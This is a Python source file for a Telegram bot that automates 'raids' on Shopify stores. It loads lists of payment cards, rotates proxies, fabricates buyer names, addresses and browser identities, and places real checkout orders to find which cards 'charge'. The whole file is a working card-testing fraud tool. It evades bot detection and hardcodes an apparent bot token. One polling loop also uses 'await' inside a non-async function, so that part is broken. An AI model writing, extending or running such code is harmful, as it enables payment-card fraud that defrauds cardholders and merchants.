# royal_telegram_bot.py
# His Majesty's Shopify Checkout Bot – Telegram Edition
# Deploy on Railway.com

import os
import sys
import re
import time
import random
import string
import uuid
import json
import threading
import asyncio
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote

import requests
import urllib3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== ROYAL CONFIGURATION ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "7661383575:AAFvNMf9S9-P9O5YyIHeN5Kr9KxtGRso078")
ADMIN_IDS = [int(x) for x in os.environ.get("ADMIN_IDS", "1431708650").split(",")]

# File paths on Railway
SITES_FILE = "sites.txt"
PROXIES_FILE = "proxies.txt"
CARDS_FILE = "cards.txt"
RESULTS_FILE = "results.txt"

# Bot state
active_raids = {}  # {chat_id: {'active': bool, 'thread': Thread, 'site': str, 'cards_total': int}}
raid_results = {}  # {chat_id: [charged_cards]}
current_progress = {}  # {chat_id: {'current': int, 'total': int, 'last_card': str}}

# ========== ORIGINAL SHOPIFY CORE (UNTOUCHED) ==========
def random_string(length):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def random_name():
    first = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emily', 'James', 'Emma', 'Robert', 'Olivia']
    last = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Wilson', 'Taylor']
    return random.choice(first), random.choice(last)

def random_address():
    data = [
        ('1600 Pennsylvania Ave NW', '', 'Washington', 'DC', '20500', '202'),
        ('350 Fifth Avenue', '', 'New York', 'NY', '10118', '212'),
        ('233 S Wacker Dr', '', 'Chicago', 'IL', '60606', '312'),
        ('1 Infinite Loop', '', 'Cupertino', 'CA', '95014', '408'),
        ('1 Microsoft Way', '', 'Redmond', 'WA', '98052', '425'),
    ]
    addr = random.choice(data)
    phone = f"+1{addr[5]}{random.randint(200,999)}{random.randint(1000,9999)}"
    return {'address1': addr[0], 'address2': addr[1], 'city': addr[2], 'countryCode': 'US', 
            'postalCode': addr[4], 'zoneCode': addr[3], 'phone': phone}

def random_ua():
    chrome_ver = f"{random.randint(100,120)}.0.{random.randint(1000,9999)}.{random.randint(10,200)}"
    return f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36'

def create_proxy_session(proxy_url=None):
    session = requests.Session()
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}
        session.verify = False
    adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=2)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def find_cheapest_product(site, proxy_url=None):
    session = create_proxy_session(proxy_url)
    session.headers.update({"User-Agent": random_ua()})
    
    try:
        resp = session.get(f"https://{site}/products.json?limit=250", timeout=15)
        if resp.status_code != 200:
            return None, None, None, "PRODUCTS_FETCH_FAILED"
        
        products = resp.json().get('products', [])
        cheapest_variant = None
        cheapest_price = float('inf')
        product_handle = None
        
        for product in products:
            for variant in product.get('variants', []):
                price = float(variant.get('price', 999999))
                if 0 < price < cheapest_price:
                    cheapest_price = price
                    cheapest_variant = variant['id']
                    product_handle = product.get('handle', '')
        
        if not cheapest_variant:
            return None, None, None, "NO_PRODUCT_FOUND"
        
        return cheapest_variant, cheapest_price, product_handle, "OK"
    except Exception as e:
        return None, None, None, str(e)[:50]

def create_checkout_session(site, variant_id, product_handle, proxy_url=None):
    ua = random_ua()
    session = create_proxy_session(proxy_url)
    session.headers.update({"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
    
    try:
        headers = {'accept': 'application/json', 'content-type': 'application/json', 'origin': f'https://{site}', 'user-agent': ua}
        resp = session.post(f'https://{site}/cart/add.js', headers=headers, json={'items': [{'id': int(variant_id), 'quantity': 1}]}, timeout=30)
        if resp.status_code != 200:
            resp = session.post(f'https://{site}/cart/add', data={'id': str(variant_id), 'quantity': '1'}, timeout=30)
            if resp.status_code != 200:
                return None, 'ERROR', 'ADD_TO_CART_FAILED'
        
        resp = session.post(f'https://{site}/cart', data={'updates[]': '1', 'checkout': ''}, allow_redirects=True, timeout=30)
        if 'checkout' not in resp.url:
            return None, 'ERROR', 'CHECKOUT_REDIRECT_FAILED'
        
        checkout_resp = session.get(resp.url, allow_redirects=True, timeout=30)
        checkout_text = checkout_resp.text
        
        lower = checkout_text.lower()
        if 'verifying your connection' in lower or 'checking your browser' in lower:
            return None, 'VERIFY', 'VERIFY_BROWSER'
        if 'access denied' in lower:
            return None, 'BLOCKED', 'ACCESS_DENIED'
        
        sig_patterns = [
            r'checkoutCardsinkCallerIdentificationSignature[&quot;:]+([^&"]+)',
            r'"checkoutCardsinkCallerIdentificationSignature"\s*:\s*"([^"]+)"',
            r'callerIdentificationSignature["\s:]+([^"&\s]+)',
        ]
        shopify_sig = None
        for pattern in sig_patterns:
            m = re.search(pattern, checkout_text)
            if m:
                shopify_sig = m.group(1).replace('&quot;', '').strip()
                if shopify_sig and len(shopify_sig) > 10:
                    break
                shopify_sig = None
        
        if not shopify_sig:
            return None, 'ERROR', 'NO_SIGNATURE'
        
        m = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', checkout_text)
        session_token = m.group(1).replace('&quot;', '').strip() if m else None
        
        m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', checkout_text)
        queue_token = m.group(1) if m else None
        
        m = re.search(r'"stableId"\s*:\s*"([a-f0-9-]{36})"', checkout_text)
        stable_id = m.group(1) if m else str(uuid.uuid4())
        
        m = re.search(r'/checkouts/cn/([^/]+)/', checkout_resp.url) or re.search(r'/checkouts/([^/]+)/', checkout_resp.url)
        checkout_source_id = m.group(1) if m else ''
        
        m = re.search(r'x-checkout-web-build-id[&quot;:]+([a-f0-9]+)', checkout_text)
        build_id = m.group(1) if m else 'fb347c24d80acb8076f676fa55018bb00cddfde9'
        
        m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', checkout_text)
        payment_method_id = m.group(1) if m else None
        
        return {
            'site': site, 'session': session, 'ua': ua, 'sig': shopify_sig,
            'session_token': session_token, 'queue_token': queue_token, 'stable_id': stable_id,
            'checkout_source_id': checkout_source_id, 'build_id': build_id, 'payment_method_id': payment_method_id,
            'checkout_url': checkout_resp.url
        }, 'OK', 'READY'
        
    except Exception as e:
        return None, 'ERROR', str(e)[:30]

def check_card(checkout_data, card, index, total, variant_id, price, require_shipping=None, proxy_url=None):
    try:
        parts = card.split("|")
        card_number, month = parts[0], int(parts[1])
        year = int("20" + parts[2]) if len(parts[2]) == 2 else int(parts[2])
        cvv = parts[3].strip()
        
        site = checkout_data['site']
        session = checkout_data['session']
        ua = checkout_data['ua']
        sig = checkout_data['sig']
        session_token = checkout_data['session_token']
        queue_token = checkout_data['queue_token']
        stable_id = checkout_data['stable_id']
        checkout_source_id = checkout_data['checkout_source_id']
        build_id = checkout_data['build_id']
        payment_method_id = checkout_data['payment_method_id']
        checkout_url = checkout_data['checkout_url']
        
        first_name, last_name = random_name()
        cardholder = f"{first_name} {last_name}"
        email = f"{first_name.lower()}{last_name.lower()}{random.randint(10,999)}@gmail.com"
        addr = random_address()
        addr['firstName'], addr['lastName'] = first_name, last_name
        
        pay_session = create_proxy_session(proxy_url)
        pay_headers = {'accept': 'application/json', 'content-type': 'application/json', 
                       'origin': 'https://checkout.pci.shopifyinc.com', 'shopify-identification-signature': sig, 'user-agent': ua}
        pay_json = {'credit_card': {'number': card_number, 'month': month, 'year': year, 'verification_value': cvv, 
                    'name': cardholder}, 'payment_session_scope': site.replace('www.', '')}
        
        resp = pay_session.post('https://checkout.pci.shopifyinc.com/sessions', headers=pay_headers, json=pay_json, timeout=30)
        if resp.status_code != 200:
            return (index, total, card, 'ERROR', 'PCI_FAILED', price)
        
        payment_session_id = resp.json().get('id')
        if not payment_session_id:
            return (index, total, card, 'ERROR', 'NO_SESSION_ID', price)
        
        if require_shipping:
            delivery = {
                'deliveryLines': [{'destination': {'streetAddress': addr},
                    'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}},
                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                    'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': True}],
                'noDeliveryRequired': [], 'useProgressiveRates': False, 'supportsSplitShipping': True
            }
        else:
            delivery = {
                'deliveryLines': [{'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}},
                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                    'deliveryMethodTypes': ['NONE'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': False}],
                'noDeliveryRequired': [], 'useProgressiveRates': False, 'supportsSplitShipping': True
            }
        
        gql_headers = {'accept': 'application/json', 'content-type': 'application/json', 'origin': f'https://{site}',
            'referer': checkout_url, 'user-agent': ua, 'x-checkout-one-session-token': session_token or '',
            'x-checkout-web-build-id': build_id, 'x-checkout-web-source-id': checkout_source_id}
        
        gql_data = {
            'variables': {
                'input': {
                    'sessionInput': {'sessionToken': session_token or ''}, 'queueToken': queue_token or '',
                    'delivery': delivery,
                    'merchandise': {'merchandiseLines': [{'stableId': stable_id, 
                        'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}', 
                            'variantId': f'gid://shopify/ProductVariant/{variant_id}', 'properties': []}},
                        'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True}}]},
                    'payment': {'totalAmount': {'any': True}, 
                        'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': payment_method_id or '', 
                            'sessionId': payment_session_id, 'billingAddress': {'streetAddress': addr}}}, 'amount': {'any': True}}],
                        'billingAddress': {'streetAddress': addr}},
                    'buyerIdentity': {'customer': {'presentmentCurrency': 'USD', 'countryCode': 'US'}, 'email': email},
                    'taxes': {'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}}},
                    'tip': {'tipLines': []}, 'note': {'message': None, 'customAttributes': []},
                },
                'attemptToken': f"{checkout_source_id}-{random_string(11)}",
            },
            'operationName': 'SubmitForCompletion',
            'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){__typename ...on SubmitSuccess{receipt{...R}}...on SubmitAlreadyAccepted{receipt{...R}}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code localizedMessage}__typename}...on Throttled{pollAfter __typename}...on SubmittedForCompletion{receipt{...R}}}}fragment R on Receipt{__typename ...on ProcessedReceipt{id redirectUrl orderStatusPageUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code __typename}}__typename}}'
        }
        
        resp = session.post(f'https://{site}/checkouts/unstable/graphql', params={'operationName': 'SubmitForCompletion'}, 
                           headers=gql_headers, json=gql_data, timeout=60)
        
        if resp.status_code != 200:
            return (index, total, card, 'ERROR', f'HTTP_{resp.status_code}', price)
        
        result = resp.json()
        resp_text = resp.text.lower()
        
        if 'errors' in result:
            err = result['errors'][0].get('message', 'ERROR')[:40]
            if 'delivery' in err.lower() and require_shipping is None:
                return check_card(checkout_data, card, index, total, variant_id, price, require_shipping=True)
            return (index, total, card, 'ERROR', err, price)
        
        completion = result.get('data', {}).get('submitForCompletion', {})
        if not completion:
            if 'card_declined' in resp_text or 'CARD_DECLINED' in resp.text:
                return (index, total, card, 'DECLINED', 'CARD_DECLINED', price)
            if 'insufficient' in resp_text:
                return (index, total, card, 'DECLINED', 'INSUFFICIENT_FUNDS', price)
            return (index, total, card, 'ERROR', 'NO_COMPLETION', price)
        
        typename = completion.get('__typename', '')
        
        if typename == 'SubmitRejected':
            errors = completion.get('errors', [])
            if errors:
                err = errors[0].get('code', errors[0].get('localizedMessage', 'REJECTED'))
                if 'DELIVERY' in err and require_shipping is None:
                    return check_card(checkout_data, card, index, total, variant_id, price, require_shipping=True)
                return (index, total, card, 'DECLINED', err, price)
            return (index, total, card, 'DECLINED', 'REJECTED', price)
        
        if typename == 'SubmitFailed':
            return (index, total, card, 'DECLINED', completion.get('reason', 'FAILED'), price)
        
        receipt = completion.get('receipt', {})
        receipt_type = receipt.get('__typename', '')
        receipt_id = receipt.get('id')
        
        if receipt_type == 'ProcessedReceipt' or receipt.get('orderStatusPageUrl'):
            return (index, total, card, 'CHARGED', 'ORDER_PLACED', price)
        
        if receipt_type == 'FailedReceipt':
            err = receipt.get('processingError', {}).get('code', 'FAILED')
            return (index, total, card, 'DECLINED', err, price)
        
        if receipt_id and receipt_type in ['ProcessingReceipt', 'WaitingReceipt', '']:
            poll_query = 'query Poll($id:ID!,$token:String!){receipt(receiptId:$id,sessionInput:{sessionToken:$token}){__typename ...on ProcessedReceipt{id orderStatusPageUrl}...on FailedReceipt{processingError{...on PaymentFailed{code}}}}}'
            for _ in range(15):
                await asyncio.sleep(2)
                try:
                    poll_resp = session.post(f'https://{site}/checkouts/unstable/graphql', headers=gql_headers,
                        json={'variables': {'id': receipt_id, 'token': session_token or ''}, 'operationName': 'Poll', 'query': poll_query}, timeout=20)
                    if poll_resp.status_code == 200:
                        poll_data = poll_resp.json().get('data', {}).get('receipt', {})
                        poll_type = poll_data.get('__typename', '')
                        
                        if poll_type == 'ProcessedReceipt' and poll_data.get('orderStatusPageUrl'):
                            return (index, total, card, 'CHARGED', 'ORDER_PLACED', price)
                        
                        if poll_type == 'FailedReceipt':
                            err = poll_data.get('processingError', {}).get('code', 'PAYMENT_FAILED')
                            return (index, total, card, 'DECLINED', err, price)
                except:
                    pass
            return (index, total, card, 'ERROR', 'POLL_TIMEOUT', price)
        
        return (index, total, card, 'ERROR', typename if typename else resp.text[:40], price)
        
    except Exception as e:
        return (index, total, card, 'ERROR', str(e)[:40], price)

# ========== TELEGRAM BOT HANDLERS ==========

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Welcome message with royal commands"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized. His Majesty's bot is private.")
        return
    
    welcome = """
👑 **ROYAL SHOPIFY CHECKOUT BOT** – His Majesty's Command Center

**Commands:**
/start - Show this menu
/upload_sites - Send .txt file with sites (one per line)
/upload_proxies - Send .txt file with proxies
/upload_cards - Send .txt file with cards (format: NUM|MM|YY|CVV)
/status - Show current raid status
/raid <site> - Start raid on specific site
/stop - Stop current raid
/results - Show charged cards from last raid
/clear - Clear all uploaded files

**Example card format:**
`4111111111111111|12|26|123`

**Example site:**
`luxury-store.myshopify.com`

**Example proxy:**
`http://user:pass@45.33.22.11:8080`

⚡ Deployed on Railway – 24/7 operation
    """
    await update.message.reply_text(welcome, parse_mode='Markdown')

async def upload_file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded text files"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    document = update.message.document
    if not document:
        await update.message.reply_text("Please send a .txt file.")
        return
    
    file_name = document.file_name
    file = await context.bot.get_file(document.file_id)
    
    # Determine file type from context
    file_type = context.user_data.get('upload_type', None)
    
    if 'sites' in file_name.lower() or file_type == 'sites':
        save_path = SITES_FILE
        file_type_name = "sites"
    elif 'proxies' in file_name.lower() or file_type == 'proxies':
        save_path = PROXIES_FILE
        file_type_name = "proxies"
    elif 'cards' in file_name.lower() or file_type == 'cards':
        save_path = CARDS_FILE
        file_type_name = "cards"
    else:
        await update.message.reply_text("❌ Unknown file type. Use /upload_sites, /upload_proxies, or /upload_cards first.")
        return
    
    # Download and save
    await file.download_to_drive(save_path)
    
    # Count lines
    with open(save_path, 'r') as f:
        lines = len([l for l in f.readlines() if l.strip()])
    
    await update.message.reply_text(f"✅ Uploaded `{file_name}`\n📊 {lines} {file_type_name} loaded.", parse_mode='Markdown')

async def upload_sites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Prepare to receive sites file"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    context.user_data['upload_type'] = 'sites'
    await update.message.reply_text("📁 Send the **sites.txt** file now (one domain per line)", parse_mode='Markdown')

async def upload_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Prepare to receive proxies file"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    context.user_data['upload_type'] = 'proxies'
    await update.message.reply_text("🔌 Send the **proxies.txt** file now (one proxy per line)", parse_mode='Markdown')

async def upload_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Prepare to receive cards file"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    context.user_data['upload_type'] = 'cards'
    await update.message.reply_text("💳 Send the **cards.txt** file now\nFormat: `NUM|MM|YY|CVV`\nExample: `4111111111111111|12|26|123`", parse_mode='Markdown')

async def raid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start raid on a specific site"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    chat_id = update.effective_chat.id
    
    # Check if raid already active
    if active_raids.get(chat_id, {}).get('active', False):
        await update.message.reply_text("⚠️ Raid already in progress. Use /stop first.")
        return
    
    # Get site from command
    if not context.args:
        await update.message.reply_text("❌ Usage: /raid <site>\nExample: /raid luxury-store.myshopify.com")
        return
    
    site = context.args[0].replace("https://", "").replace("http://", "").rstrip('/')
    
    # Check files exist
    if not os.path.exists(CARDS_FILE):
        await update.message.reply_text("❌ No cards file uploaded. Use /upload_cards")
        return
    
    if not os.path.exists(PROXIES_FILE):
        await update.message.reply_text("❌ No proxies file uploaded. Use /upload_proxies")
        return
    
    # Load data
    with open(CARDS_FILE, 'r') as f:
        cards = [line.strip() for line in f if line.strip() and '|' in line]
    
    with open(PROXIES_FILE, 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found in file.")
        return
    
    if not proxies:
        await update.message.reply_text("❌ No valid proxies found in file.")
        return
    
    await update.message.reply_text(f"🎯 **Starting raid on {site}**\n💳 Cards: {len(cards)}\n🔌 Proxies: {len(proxies)}\n⚡ This may take several minutes...", parse_mode='Markdown')
    
    # Start raid in background thread
    raid_thread = threading.Thread(
        target=run_raid,
        args=(chat_id, site, cards, proxies, update, context),
        daemon=True
    )
    
    active_raids[chat_id] = {
        'active': True,
        'thread': raid_thread,
        'site': site,
        'cards_total': len(cards)
    }
    raid_results[chat_id] = []
    
    raid_thread.start()

async def stop_raid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop the current raid"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    chat_id = update.effective_chat.id
    
    if not active_raids.get(chat_id, {}).get('active', False):
        await update.message.reply_text("ℹ️ No active raid to stop.")
        return
    
    active_raids[chat_id]['active'] = False
    await update.message.reply_text("🛑 Raid stopping... (may take a moment for threads to finish)")

async def raid_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show current raid progress"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    chat_id = update.effective_chat.id
    
    if not active_raids.get(chat_id, {}).get('active', False):
        await update.message.reply_text("ℹ️ No active raid.")
        return
    
    progress = current_progress.get(chat_id, {'current': 0, 'total': 0, 'last_card': 'None'})
    charged = len(raid_results.get(chat_id, []))
    
    status_text = f"""
📊 **Raid Status**
Site: `{active_raids[chat_id]['site']}`
Progress: `{progress['current']}/{progress['total']}`
✅ Charged: `{charged}`
💳 Last card: `{progress['last_card']}`
    """
    await update.message.reply_text(status_text, parse_mode='Markdown')

async def show_results(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show charged cards from last raid"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    chat_id = update.effective_chat.id
    charged = raid_results.get(chat_id, [])
    
    if not charged:
        await update.message.reply_text("ℹ️ No charged cards yet.")
        return
    
    # Send first 20 results (Telegram has message limits)
    results_text = "✅ **CHARGED CARDS**\n\n" + "\n".join(charged[:20])
    await update.message.reply_text(results_text, parse_mode='Markdown')
    
    if len(charged) > 20:
        await update.message.reply_text(f"Plus {len(charged) - 20} more. Full list saved to {RESULTS_FILE}")

async def clear_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear all uploaded files"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    for file in [SITES_FILE, PROXIES_FILE, CARDS_FILE]:
        if os.path.exists(file):
            os.remove(file)
    
    await update.message.reply_text("🧹 All files cleared. Ready for new uploads.")

def run_raid(chat_id, site, cards, proxies, update, context):
    """Background thread function to run the checkout bot"""
    
    # Create async task to send progress updates
    async def send_progress(idx, total, card, status, msg):
        current_progress[chat_id] = {'current': idx, 'total': total, 'last_card': card}
        if idx % 10 == 0 or status == 'CHARGED':  # Update every 10 cards or on charge
            progress_text = f"⚡ Progress: {idx}/{total} | Last: {card[:8]}... | {msg}"
            await context.bot.send_message(chat_id=chat_id, text=progress_text)
    
    # Function to run async sends from sync thread
    def sync_send_progress(idx, total, card, status, msg):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(send_progress(idx, total, card, status, msg))
        loop.close()
    
    # Proxy rotation
    proxy_list = proxies.copy()
    proxy_index = 0
    
    # Find cheapest product
    for attempt in range(3):
        proxy = proxy_list[proxy_index % len(proxy_list)]
        proxy_index += 1
        variant_id, price, handle, status = find_cheapest_product(site, proxy)
        if variant_id:
            break
        time.sleep(2)
    
    if not variant_id:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(
            context.bot.send_message(chat_id=chat_id, text=f"❌ Cannot find product on {site}: {status}")
        )
        loop.close()
        active_raids[chat_id]['active'] = False
        return
    
    # Attack with cards
    results = []
    for idx, card in enumerate(cards, 1):
        if not active_raids.get(chat_id, {}).get('active', False):
            break
        
        # Get proxy for this attempt
        proxy = proxy_list[proxy_index % len(proxy_list)]
        proxy_index += 1
        
        # Create checkout session
        checkout_data, ck_status, ck_msg = create_checkout_session(site, variant_id, handle, proxy)
        
        if ck_status != 'OK':
            sync_send_progress(idx, len(cards), card, ck_status, ck_msg)
            if ck_status == 'CHARGED':
                results.append(card)
                raid_results[chat_id].append(card)
            continue
        
        # Check card
        result = check_card(checkout_data, card, idx, len(cards), variant_id, price, proxy_url=proxy)
        
        # Send progress update
        sync_send_progress(idx, len(cards), card, result[3], result[4])
        
        if result[3] == 'CHARGED':
            results.append(card)
            raid_results[chat_id].append(card)
        
        # Random delay between cards
        time.sleep(random.uniform(1, 3))
    
    # Raid finished
    async def send_summary():
        summary = f"""
🏁 **Raid Complete**
Site: `{site}`
Cards tested: `{len(cards)}`
✅ Charged: `{len(results)}`
❌ Declined: `{len(cards) - len(results)}`

Use /results to see charged cards.
        """
        await context.bot.send_message(chat_id=chat_id, text=summary, parse_mode='Markdown')
        
        if results:
            with open(RESULTS_FILE, 'w') as f:
                f.write("\n".join(results))
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(send_summary())
    loop.close()
    
    active_raids[chat_id]['active'] = False

# ========== MAIN – DEPLOY ON RAILWAY ==========

def main():
    """Start the Telegram bot"""
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Set BOT_TOKEN environment variable on Railway!")
        sys.exit(1)
    
    # Create bot application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("upload_sites", upload_sites))
    application.add_handler(CommandHandler("upload_proxies", upload_proxies))
    application.add_handler(CommandHandler("upload_cards", upload_cards))
    application.add_handler(CommandHandler("raid", raid_command))
    application.add_handler(CommandHandler("stop", stop_raid))
    application.add_handler(CommandHandler("status", raid_status))
    application.add_handler(CommandHandler("results", show_results))
    application.add_handler(CommandHandler("clear", clear_files))
    application.add_handler(MessageHandler(filters.Document.ALL, upload_file_handler))
    
    # Start bot
    print("👑 Royal Telegram Bot is running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
